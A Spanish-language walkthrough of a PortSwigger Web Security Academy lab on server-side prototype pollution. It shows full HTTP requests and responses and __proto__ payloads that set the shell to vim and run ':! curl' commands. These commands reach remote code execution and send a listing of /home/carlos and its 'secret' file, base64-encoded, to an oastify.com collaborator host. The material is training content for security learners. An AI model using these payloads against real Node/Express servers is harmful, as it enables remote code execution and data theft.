---
description: >-
  https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution
---

# Lab 10: Exfiltrating sensitive data via server-side prototype pollution

Primero encontramos la siguiente peticion:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0ade001c03d1540682f0971f00b70020.web-security-academy.net
Cookie: session=9Z8pN21fPP7CZIMDolCzh7uAfP6FL594
Content-Length: 168
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"9Z8pN21fPP7CZIMDolCzh7uAfP6FL594"}
```
{% endcode %}

Lo anterior responde asi:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c4-o1d3jaxaEdwNnwhzORq6DYSiPxI"
Date: Tue, 25 Jun 2024 21:11:35 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 196

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true}
```
{% endcode %}

Teniendo en cuenta lo anterior, enviamos la siguiente peticion:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0ade001c03d1540682f0971f00b70020.web-security-academy.net
Cookie: session=9Z8pN21fPP7CZIMDolCzh7uAfP6FL594
Content-Length: 208
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"9Z8pN21fPP7CZIMDolCzh7uAfP6FL594","__proto__": {
    "json spaces":10
}}
```
{% endcode %}

Y lo anterior, entrego la siguiente respuesta en raw:

```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"14e-/rxYzhSfiD4zL1vVonmGpZgVmW0"
Date: Tue, 25 Jun 2024 21:11:52 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 334

{
          "username": "wiener",
          "firstname": "Peter",
          "lastname": "Wiener",
          "address_line_1": "Wiener HQ",
          "address_line_2": "One Wiener Way",
          "city": "Wienerville",
          "postcode": "BU1 1RP",
          "country": "UK",
          "isAdmin": true,
          "json spaces": 10
}
```

Los 10 espacios antecedidos por cada objeto indica que es susceptible a este tipo de ataques.

Al acceder al apartado de admin:

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Al clickear al button previo se genera la siguiente petición:

{% code overflow="wrap" %}
```json
POST /admin/jobs HTTP/2
Host: 0ade001c03d1540682f0971f00b70020.web-security-academy.net
Cookie: session=9Z8pN21fPP7CZIMDolCzh7uAfP6FL594
Content-Length: 126
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ade001c03d1540682f0971f00b70020.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"csrf":"E5PnMR6lCAZooCcKBud78idhOfsoN5TZ","sessionId":"9Z8pN21fPP7CZIMDolCzh7uAfP6FL594","tasks":["db-cleanup","fs-cleanup"]}
```
{% endcode %}

La petición previa entrega la siguiente respuesta:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"1c7-o/UMl8aG2WYfWY22q3KHWd04RGU"
Date: Tue, 25 Jun 2024 21:16:53 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 455

{
          "results": [
                    {
                              "name": "db-cleanup",
                              "description": "Database cleanup",
                              "success": true
                    },
                    {
                              "name": "fs-cleanup",
                              "description": "Filesystem cleanup",
                              "success": true
                    }
          ]
}
```
{% endcode %}

Esto genera tareas en segundo plano que limpian la base de datos y el sistema de archivos.

Por lo anterior, generamos un collaborator y enviamos la siguiente peticion:

```json
POST /my-account/change-address HTTP/2
Host: 0a7e008b0499e6c481688ab4000900af.web-security-academy.net
Cookie: session=4tH7NKRjQmuej0xm7k7XQpweZtk40bS7
Content-Length: 284
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0a7e008b0499e6c481688ab4000900af.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7e008b0499e6c481688ab4000900af.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"4tH7NKRjQmuej0xm7k7XQpweZtk40bS7","__proto__": {
    "shell":"vim",
    "input":":! curl https://em4or21l4n6gh8j45x85zbha51btzlna.oastify.com\n"
}}
```

La respuesta de la peticion previa es:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"11b-xEcQdnwNDfeY/SNwPrhCfg+9Ubs"
Date: Wed, 26 Jun 2024 15:51:49 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 283

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true,"shell":"vim","input":":! curl https://em4or21l4n6gh8j45x85zbha51btzlna.oastify.com\n"}
```
{% endcode %}

El payload utilizado es:

```json
,"__proto__": {
    "shell":"vim",
    "input":":! curl https://em4or21l4n6gh8j45x85zbha51btzlna.oastify.com\n"
}
```

Luego de lo anterior, clickeamos en el button de "iniciar tarea":

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Y luego de enviar la petición previa sobre actualización de datos y enviar la petición de inicio de tarea, se detecta trafico en el collaborator:

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Gracias a lo anterior, sabemos que tenemos la posibilidad de utilizar el RCE:

Asi que para resolver el ejercicio utilizaremos el siguiente payload que codifica la salida del comando ls en base64 y luego la envia al collaborator:

{% code overflow="wrap" %}
```json
"input":":! ls /home/carlos | base64 | curl -d @- https://79ehevoergt9416xsqvym443suymmfa4.oastify.com\n"
```
{% endcode %}

Luego de enviar la peticion:

```bash
POST /my-account/change-address HTTP/2
Host: 0a7e008b0499e6c481688ab4000900af.web-security-academy.net
Cookie: session=4tH7NKRjQmuej0xm7k7XQpweZtk40bS7
Content-Length: 317
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://0a7e008b0499e6c481688ab4000900af.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7e008b0499e6c481688ab4000900af.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"4tH7NKRjQmuej0xm7k7XQpweZtk40bS7","__proto__": {
    "shell":"vim",
    "input":":! ls /home/carlos | base64 | curl -d @- https://79ehevoergt9416xsqvym443suymmfa4.oastify.com\n"
}}
```

Y luego de enviar la peticion del button:

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

La respuesta de la peticion del button es la siguiente:

{% code overflow="wrap" %}
```json
{
    "results": [
        {
            "name": "db-cleanup",
            "success": false,
            "error": {
                "code": 1,
                "message": "Command failed: od -An -N1 -i /dev/random\nVim: Warning: Output is not to a terminal\nVim: Warning: Input is not from a terminal\n\r\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100    79  100    55  100    24   1666    727 --:--:-- --:--:-- --:--:--  2393\n\r\nPress ENTER or type command to continue\r\n"
            }
        },
        {
            "name": "fs-cleanup",
            "success": false,
            "error": {
                "code": 1,
                "message": "Command failed: od -An -N1 -i /dev/random\nVim: Warning: Output is not to a terminal\nVim: Warning: Input is not from a terminal\n\r\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100    79  100    55  100    24   2500   1090 --:--:-- --:--:-- --:--:--  3590\n\r\nPress ENTER or type command to continue\r\n"
            }
        }
    ]
}
```
{% endcode %}

Y en el collaborator se obtiene el siguiente trafico:

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Al decodificar el base64 encontramos esto:

```
node_apps
secret
```

Por lo anterior, finalizamos enviando la siguiente carga:

```bash
POST /my-account/change-address HTTP/2
Host: 0a7e008b0499e6c481688ab4000900af.web-security-academy.net
Cookie: session=4tH7NKRjQmuej0xm7k7XQpweZtk40bS7
Content-Length: 325
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://0a7e008b0499e6c481688ab4000900af.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7e008b0499e6c481688ab4000900af.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"4tH7NKRjQmuej0xm7k7XQpweZtk40bS7","__proto__": {
    "shell":"vim",
    "input":":! cat /home/carlos/secret | base64 | curl -d @- https://79ehevoergt9416xsqvym443suymmfa4.oastify.com\n"
}}
```

Y logramos obtener el secreto luego de consumir el servicio previo y luego el del button:

```bash
POST / HTTP/1.1
Host: 79ehevoergt9416xsqvym443suymmfa4.oastify.com
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 44
Content-Type: application/x-www-form-urlencoded

RXl2cDZwVkgyNUZFWnJWaFNXVEg5dEkyVmVwUzFoUWs=
```
